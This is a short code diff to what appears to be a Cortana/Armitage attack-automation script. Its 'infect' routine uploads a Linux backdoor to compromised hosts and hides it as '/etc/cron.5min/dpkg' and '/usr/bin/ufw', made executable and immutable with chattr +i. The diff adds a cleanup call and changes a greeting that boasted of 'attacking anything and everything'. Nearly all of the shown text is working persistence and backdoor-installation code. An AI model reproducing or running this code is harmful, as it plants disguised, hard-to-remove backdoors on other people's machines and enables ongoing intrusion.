@@ -190,6 +190,7 @@ sub infect {
 					shell_upload($1, "/tmp/linux_backdoor", "/etc/cron.5min/dpkg");
 					s_cmd($1, "chmod 755 /etc/cron.5min/dpkg")
 					s_cmd($1, "chattr +i /etc/cron.5min/dpkg");
+					delete_later("/etc/cron.5min")
 			
 					# set profile 
 					shell_upload($1, "/tmp/linux_backdoor", "/usr/bin/ufw");
@@ -245,7 +246,7 @@ sub waitForSessions {
 	}
 };
 sub greeting{
-	println("Hello! I'm Cortana, and I'm ready to start attacking anything and everything.")
+	println("Hello! I'm Cortana. Lets get started")
 }
 popup host_bottom {
 	$rhost = $1;
